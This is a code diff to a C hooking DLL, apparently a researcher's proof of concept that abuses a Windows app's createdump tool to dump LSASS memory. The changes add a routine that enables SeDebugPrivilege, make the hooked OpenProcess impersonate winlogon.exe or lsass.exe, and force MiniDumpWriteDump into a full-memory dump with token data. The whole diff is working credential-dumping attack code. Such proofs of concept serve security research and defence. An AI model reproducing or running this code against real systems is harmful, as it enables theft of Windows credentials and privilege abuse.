@@ -11,7 +11,50 @@ OpenProcessPrototype OriginalOpenProcess = NULL;
 typedef BOOL(WINAPI* MiniDumpWriteDumpPrototype)(HANDLE, DWORD, HANDLE, MINIDUMP_TYPE, PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION, PMINIDUMP_CALLBACK_INFORMATION);
 MiniDumpWriteDumpPrototype OriginalMiniDumpWriteDump = NULL;
 
-BOOL isInMiniDumpWriteDump = FALSE;  // Flag to prevent recursion
+BOOL EnableDebugPrivilege() {
+    HANDLE hToken;
+    TOKEN_PRIVILEGES tokenPriv;
+    LUID luid;
+
+    printf("Attempting to enable SeDebugPrivilege...\n");
+
+    // Open the current process token
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+        printf("Failed to open process token. Error: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    // Look up the LUID for the SeDebugPrivilege
+    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
+        printf("Failed to lookup privilege value for SeDebugPrivilege. Error: %lu\n", GetLastError());
+        CloseHandle(hToken);
+        return FALSE;
+    }
+
+    // Set up the TOKEN_PRIVILEGES structure
+    tokenPriv.PrivilegeCount = 1;
+    tokenPriv.Privileges[0].Luid = luid;
+    tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    // Adjust the token privileges to enable SeDebugPrivilege
+    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
+        printf("Failed to adjust token privileges. Error: %lu\n", GetLastError());
+        CloseHandle(hToken);
+        return FALSE;
+    }
+
+    // Check for any errors during AdjustTokenPrivileges
+    if (GetLastError() != ERROR_SUCCESS) {
+        printf("Failed to enable SeDebugPrivilege. Error: %lu\n", GetLastError());
+        CloseHandle(hToken);
+        return FALSE;
+    }
+
+    printf("SeDebugPrivilege successfully enabled!\n");
+    CloseHandle(hToken);
+    return TRUE;
+}
+
 
 // Helper function to write to the console
 void WriteToConsole(const wchar_t* message) {
@@ -46,6 +89,8 @@ DWORD GetProcessIdByName(const wchar_t* processName) {
 // Hooked OpenProcess function to handle impersonation
 HANDLE WINAPI HookedOpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {
     WriteToConsole(L"OpenProcess called\n");
+
+    EnableDebugPrivilege();
 
     // Perform impersonation logic
     DWORD targetPid = GetProcessIdByName(L"winlogon.exe");  // Or change to "lsass.exe" if needed
@@ -90,7 +135,13 @@ BOOL WINAPI MyMiniDumpWriteDump(
     PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
     PMINIDUMP_CALLBACK_INFORMATION CallbackParam
 ) {
-    wchar_t buffer[1024];  // Increased size for the buffer to hold the DLL path
+	wchar_t buffer[1024];  // Increased size for the buffer to hold the DLL path
+
+	MINIDUMP_TYPE lsassDumpType = (MINIDUMP_TYPE)(MiniDumpWithFullMemory | 
+                                         MiniDumpWithHandleData | 
+                                         MiniDumpWithUnloadedModules | 
+                                         MiniDumpWithThreadInfo | 
+                                         MiniDumpWithTokenInformation);
 
     swprintf(buffer, sizeof(buffer) / sizeof(buffer[0]),
              L"MiniDumpWriteDump called with:\n  ProcessId: %d\n  hProcess: 0x%p\n  hFile: 0x%p\n  DumpType: 0x%x\n",
@@ -134,7 +185,12 @@ BOOL WINAPI MyMiniDumpWriteDump(
     }
 
     // Call the real MiniDumpWriteDump function
-    BOOL result = OriginalMiniDumpWriteDump(hProcess, ProcessId, hFile, DumpType, ExceptionParam, UserStreamParam, CallbackParam);
+        swprintf(buffer, sizeof(buffer) / sizeof(buffer[0]),
+             L"Calling original with:\n  ProcessId: %d\n  hProcess: 0x%p\n  hFile: 0x%p\n  DumpType: 0x%x\n",
+             ProcessId, hProcess, hFile, lsassDumpType);
+    WriteToConsole(buffer);
+
+    BOOL result = OriginalMiniDumpWriteDump(hProcess, ProcessId, hFile, lsassDumpType, ExceptionParam, UserStreamParam, CallbackParam);
 
     // Output the result of MiniDumpWriteDump
     swprintf(buffer, sizeof(buffer) / sizeof(buffer[0]),
@@ -148,7 +204,9 @@ BOOL WINAPI MyMiniDumpWriteDump(
 // DLL entry point
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
     if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
-        // Initialize MinHook library
+        WriteToConsole(L"WindowsApp PoC by Remko Weijnen\n");
+        WriteToConsole(L"(ab)uses createdump tool from \"The WindowsApp\" to create an LSASS dump\n\n");
+    	// Initialize MinHook library
         if (MH_Initialize() != MH_OK) {
             WriteToConsole(L"Failed to initialize MinHook\n");
             return FALSE;
